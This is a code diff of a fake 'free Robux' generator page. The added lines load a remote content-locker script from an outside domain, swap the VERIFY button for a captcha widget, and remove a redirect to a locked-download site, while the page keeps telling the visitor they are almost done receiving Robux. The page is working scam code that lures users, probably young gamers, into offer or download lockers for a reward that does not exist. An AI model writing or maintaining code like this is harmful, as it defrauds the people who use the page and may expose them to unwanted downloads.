@@ -15,7 +15,8 @@
 
 
 <body>
-
+<script type="text/javascript" src="https://verifyuser.org/cp/js/mo21p"></script>
+    
     <div class="h-screen w-full left-0 bottom-0 right-0 top-0 absolute SYF2 hidden">
     </div>
 
@@ -403,9 +404,12 @@
                                                     class="drop-shadow-2xl -mt-2 mb-4 CPATH-1-REVERSE w-2/3 relative mx-auto p-2 bg-[#E0BF00] animate__animated animate__pulse animate__infinite">
 
                                                     <button  type="text"
-                                                        class="uppercase bg-[#ffff00] text-neutral-800 text-3xl w-full pb-2 pt-6 CPATH-1-REVERSE"
-                                                        onclick="CPABuildLock();">VERIFY
+                                                        <p hidden>class="uppercase bg-[#ffff00] text-neutral-800 text-3xl w-full pb-2 pt-6 CPATH-1-REVERSE"
+                                                    onclick="CPABuildLock();">VERIFY</p>
                                                         
+                                                <center>
+                                                    <div data-captcha-enable="true"></div>
+                                                </center>    
                                                     </button>
 
                                                 </div>
@@ -1211,9 +1215,9 @@ function S4() {
 }
 
 function LAST() {
-location.href = "https://downloadlocked.com/cl/i/wow7o2";
 
-    $("#TEXTEND").text(USERNAME + ", you are almost finished! To finish transfering " + SELECTED_VB + " Robux to your account click the Verify button below and follow instructions.")
+
+    $("#TEXTEND").text(USERNAME + ", you are almost finished! To finish transfering " + SELECTED_VB + " Robux to your account click the button below and follow instructions.")
 
     $("#END").append($("#TEST1"));
 
